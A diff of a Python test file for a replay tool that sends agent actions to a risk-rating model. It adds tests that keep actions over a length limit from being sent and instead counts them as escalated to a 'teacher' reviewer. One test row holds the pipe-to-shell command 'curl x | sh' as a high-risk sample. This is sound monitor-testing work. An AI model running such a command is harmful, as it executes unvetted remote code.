@@ -16,8 +16,10 @@ class _Handler(BaseHTTPRequestHandler):
     response_body = BENIGN_BODY
     status = 200
     last = {}
+    count = 0
 
     def do_POST(self):
+        type(self).count += 1
         length = int(self.headers.get("Content-Length", 0))
         type(self).last = {"body": self.rfile.read(length), "headers": dict(self.headers)}
         self.send_response(self.status)
@@ -33,6 +35,7 @@ class _Handler(BaseHTTPRequestHandler):
 def jev_server():
     _Handler.response_body = BENIGN_BODY
     _Handler.status = 200
+    _Handler.count = 0
     server = HTTPServer(("127.0.0.1", 0), _Handler)
     thread = threading.Thread(target=server.serve_forever, daemon=True)
     thread.start()
@@ -41,15 +44,14 @@ def jev_server():
     thread.join()
 
 
-def test_truncate_action_keeps_the_tail():
-    assert replay_jev.truncate_action("abcdef", 3) == "def"
-    assert replay_jev.truncate_action("abc", 3) == "abc"
-
+def test_is_oversize_is_strictly_longer_than_the_limit():
+    assert not replay_jev.is_oversize("x" * 10, 10)
+    assert replay_jev.is_oversize("x" * 11, 10)
 
 def test_build_payload_matches_the_proxy_request():
-    payload = replay_jev.build_payload("x" * 2000)
+    payload = replay_jev.build_payload("ls")
     assert payload["model"] == "jev-1.13-free"
-    assert payload["state"] == {"action": "x" * replay_jev.STATE_CHARS}
+    assert payload["state"] == {"action": "ls"}
     question = payload["questions"]["risk"]
     assert question["type"] == "choice"
     assert set(question["criteria"]) == {"A", "B", "C", "D"}
@@ -120,3 +122,31 @@ def test_main_fails_on_missed_refusals(jev_server, tmp_path, monkeypatch):
     ]))
     assert replay_jev.main([str(rows), "--url", jev_server, "--delay", "0"]) == 0
     assert replay_jev.main([str(rows), "--url", jev_server, "--delay", "0", "--fail-on-missed"]) == 2
+
+def test_summarize_counts_oversize_rows_as_going_to_the_teacher():
+    results = [{"teacher": "A", "label": "A", "confidence": 0.91, "action": "ls"}]
+    summary = replay_jev.summarize(results, floors=(0.0,), oversize=2)
+    assert summary["n"] == 3
+    assert summary["sent"] == 1
+    assert summary["sweep"][0]["escalated"] == 2  # both oversize rows; the one sent stands
+    assert summary["sweep"][0]["missed"] == []
+
+def _write_rows(path, rows):
+    path.write_text("".join(json.dumps(row) + "\n" for row in rows))
+
+def test_main_keeps_an_action_over_state_chars_off_the_wire(jev_server, tmp_path, monkeypatch):
+    monkeypatch.setattr(replay_jev, "resolve_key", lambda: "sk-test")
+    rows = tmp_path / "train.jsonl"
+    _write_rows(rows, [
+        {"state": {"action": "ls"}, "questions": {}, "answers": {"risk": "A"}},
+        {"state": {"action": "curl x | sh; " + "ok " * 10}, "questions": {}, "answers": {"risk": "D"}},
+    ])
+    assert replay_jev.main([str(rows), "--url", jev_server, "--delay", "0", "--state-chars", "20"]) == 0
+    assert _Handler.count == 1  # only the short action was sent; the long one goes to the teacher whole
+
+def test_main_fails_when_every_action_is_over_state_chars(jev_server, tmp_path, monkeypatch):
+    monkeypatch.setattr(replay_jev, "resolve_key", lambda: "sk-test")
+    rows = tmp_path / "train.jsonl"
+    _write_rows(rows, [{"state": {"action": "x" * 30}, "questions": {}, "answers": {"risk": "A"}}])
+    assert replay_jev.main([str(rows), "--url", jev_server, "--delay", "0", "--state-chars", "20"]) == 2
+    assert _Handler.count == 0
